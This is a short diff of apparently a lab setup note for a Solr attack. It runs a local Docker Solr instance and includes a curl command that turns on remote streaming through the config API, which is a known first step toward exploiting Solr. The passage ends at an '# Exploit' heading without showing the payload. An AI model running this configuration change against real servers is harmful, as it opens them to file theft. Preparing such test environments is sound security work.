@@ -4,9 +4,10 @@
 ```
 # stand up test on docker
 docker run --name solrbear -d -p 8983:8983 -t solr
+docker start solrbear
 
 # Enable remote stream
-TARGET="127.0.0.1:8983"
+TARGET="localhost:8983"
 curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://$TARGET/solr/movie/config -H 'Content-type:application/json'
 
 # Exploit
